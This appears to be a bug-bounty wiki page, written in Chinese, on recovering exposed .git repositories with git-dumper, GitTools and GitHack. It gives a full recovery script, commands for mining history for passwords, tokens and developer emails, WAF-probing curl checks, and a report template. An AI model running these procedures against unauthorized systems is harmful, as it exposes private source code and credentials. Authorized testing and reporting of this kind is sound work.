---
type: wiki
category: tool
tool: git-dumper,githack,gittools
status: active
last-updated: 2026-04-21
---

# Tool: git-dumper + GitHack + GitTools（.git 洩漏還原）

> **用途：** 當目標暴露 `/.git/` 時，把 repo 歷史 **完整還原到本地**，然後用 `git log` / trufflehog 深挖。
> 三個工具各有優缺，**建議全部跑**（見 CLAUDE.md「.git 洩漏必須使用多工具驗證」）。

## 三工具對比

| 工具 | 優點 | 缺點 |
|------|------|------|
| **git-dumper** | ✅ 最穩 ✅ 還原 commit 歷史 | 偶爾漏檔 |
| **GitTools (Extractor)** | ✅ 還原多 commit 版本 ✅ 補 git-dumper 漏的 | 命令較複雜 |
| **GitHack** | ✅ 無依賴 ✅ 穩定 | 只抓當前 HEAD 的檔案 |

**推薦流程：** git-dumper → GitTools → GitHack（兜底）

## git-dumper（首選）

### 安裝

```bash
pip3 install git-dumper

# 或 clone
git clone https://github.com/arthaud/git-dumper
cd git-dumper && pip3 install -r requirements.txt
```

### 基本用法

```bash
# 還原到 ./dump/
git-dumper https://target.gov.tw/.git/ ./dump

# 更多 threads（快）
git-dumper --jobs 20 https://target/.git/ ./dump

# 帶 auth
git-dumper -H 'Cookie: sess=xxx' https://target/.git/ ./dump

# 帶 UA
git-dumper --user-agent 'Mozilla/5.0' https://target/.git/ ./dump
```

### 還原後檢查

```bash
cd dump
git status
git log --oneline
git log --all --full-history  # 看所有分支歷史
git branch -a                 # 看有哪些 branch
git stash list                # 看有沒有 stash

# 找有趣的 commit
git log --all --full-history -- "*password*" "*.env" "*.sql" "*secret*"

# 顯示某 commit 的完整 diff
git show abc123

# 歷史版本的 config
git show HEAD:config/database.yml
git show HEAD~5:config/database.yml
```

## GitTools（補充）

### 安裝

```bash
git clone https://github.com/internetwache/GitTools.git
```

### 用 Extractor 還原多版本

```bash
# 1. 先用 Dumper
./GitTools/Dumper/gitdumper.sh https://target/.git/ ./dump

# 2. 用 Extractor 還原每個 commit
./GitTools/Extractor/extractor.sh ./dump ./extracted

# 這會產生多個目錄：
# ./extracted/0-commit_hash1/
# ./extracted/1-commit_hash2/
# ./extracted/2-commit_hash3/
# 每個代表一個 commit 的完整檔案狀態

# 找歷史 password 變化
diff -r ./extracted/0-xxx/config ./extracted/1-yyy/config
```

### 用 Finder 找 domain 下的 .git

```bash
./GitTools/Finder/gitfinder.py -i subs.txt -o found.txt
```

## GitHack（兜底）

### 安裝

```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
pip3 install -r requirements.txt
```

### 基本用法

```bash
python2 GitHack.py https://target.gov.tw/.git/

# 會建 target.gov.tw_xxx/ 目錄
# 不含歷史，但穩定
```

## 完整流程（推薦）

```bash
#!/bin/bash
TARGET_URL="$1"  # e.g. https://target.gov.tw
TARGET_NAME=$(echo "$TARGET_URL" | sed 's|https\?://||' | tr / _)

mkdir -p "./recovered/$TARGET_NAME"
cd "./recovered/$TARGET_NAME"

# 1. git-dumper（首選）
echo "[1/3] git-dumper"
git-dumper "$TARGET_URL/.git/" ./dumper

# 2. GitTools Extractor（補歷史）
echo "[2/3] GitTools Extractor"
mkdir -p ./gittools
~/GitTools/Dumper/gitdumper.sh "$TARGET_URL/.git/" ./gittools
~/GitTools/Extractor/extractor.sh ./gittools ./gittools-extracted

# 3. GitHack（兜底）
echo "[3/3] GitHack"
python2 ~/GitHack/GitHack.py "$TARGET_URL/.git/"

# 4. 綜合分析
echo "=== git log ==="
cd dumper && git log --oneline | head -20

echo "=== 找 password / secret / token ==="
git log --all --full-history -- "*password*" "*secret*" "*token*" "*.env" "*.sql"

echo "=== 掃 trufflehog ==="
trufflehog git file://. --only-verified
```

## 進階分析

### 1. 找刪除過的敏感檔

```bash
cd dumper

# 看所有曾經存在的檔案
git log --all --name-only --pretty=format: | sort -u

# 找曾經存在但現在沒了的
git log --all --diff-filter=D --name-only | sort -u
```

### 2. 找歷史版本的 config

```bash
# 某檔案的所有版本
git log --all --follow -- config/database.yml

# 看某 commit 的該檔案
git show abc123:config/database.yml

# 比較現在 vs 某歷史版本
git diff HEAD abc123 -- config/database.yml
```

### 3. 提取 remote URL（可能是私有 repo 線索）

```bash
cat .git/config
# [remote "origin"]
#   url = https://internal-gitlab.company.com/team/project.git
```

### 4. 看 reflog / logs/HEAD（部署伺服器資訊）

```bash
cat .git/logs/HEAD
# 裡面有 user.email + user.name = 開發者
# 可能是 supplier 的員工 email
```

### 5. 掃敏感字串

```bash
# 用 grep
git grep -i "password\|secret\|api_key\|token" $(git rev-list --all)

# 用 trufflehog（最推薦）
trufflehog git file:///path/to/dumper --only-verified

# 用 gitleaks（備選）
gitleaks detect --source=. -v
```

## 常見狀況處理

### 錯誤：Not a git repository

```bash
# git-dumper 沒抓到 .git/HEAD → 手動確認
curl -sI https://target/.git/HEAD
curl -s https://target/.git/HEAD  # 應該顯示 "ref: refs/heads/main"

# 可能是反向代理設限：試不同路徑
curl -sI https://target/legacy/.git/HEAD
curl -sI https://target/v1/.git/HEAD
```

### 錯誤：packed refs 抓不到

```bash
# 用 GitHack 補
python2 GitHack.py https://target/.git/
```

### 403 or 404 on specific objects

```bash
# WAF 擋 .pack 檔
# 試 .idx / .pack 的前綴是否能 probe：
curl -I https://target/.git/objects/pack/
curl -s https://target/.git/objects/info/packs
```

### 只有 /.git/HEAD 但沒 /.git/config

```bash
# honeypot 陷阱（用 .git/HEAD 假誘餌）
# 確認：如果還原的 repo 是空的 → 是 honeypot
cd dumper && git log 2>&1 | head
```

## bbflow 整合

```bash
# hunt-git-exposure 會偵測 .git + 判斷 honeypot
bbflow hunt target --only git-exposure
```

## 常見 path 變體

```bash
# /.git/ 直接
/.git/config
/.git/HEAD

# 子目錄（有些系統把 web root 設在子目錄）
/subfolder/.git/config
/v1/.git/config
/legacy/.git/config
/beta/.git/config

# 大小寫變化
/.GIT/config
/.Git/config
```

實戰：用 `hunt-git-exposure` 或 ffuf 掃這些變體。

## 報告寫法

```markdown
## 漏洞概述
https://target.gov.tw/.git/ 可匿名下載完整 repo 歷史，包含：
- 142 個 commit 歷史
- 3 組開發者 email（從 git log 洩漏）
- 歷史版本 config/database.yml 含 DB_PASSWORD（已 rotate 但仍為歷史 PII 洩漏）

## 重現步驟
```bash
# 1. 確認 .git 暴露
curl -sI https://target.gov.tw/.git/HEAD
# HTTP/1.1 200 OK

# 2. 還原 repo
pip3 install git-dumper
git-dumper https://target.gov.tw/.git/ ./dump

# 3. 驗證歷史
cd dump && git log --oneline | head -10
# abc123 Fix login bug
# def456 Update DB password
# ...

# 4. 抽敏感內容
git log --all -- "*.env" "*.yml"
git show abc123:config/database.yml
```

## 影響
- 142 個 commit 的原始碼洩漏
- 3 組開發者 email（可能用於 phishing）
- 歷史 DB password 洩漏（值：xxx****yyy）

## Severity
P2-HIGH（若歷史密碼仍有效 → P1）
```

## 關聯文件

- [10-hunter-config-leak.md](10-hunter-config-leak.md) — `.git/` 偵測
- [27-tool-trufflehog.md](27-tool-trufflehog.md) — 還原後掃 secret
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md) §#1
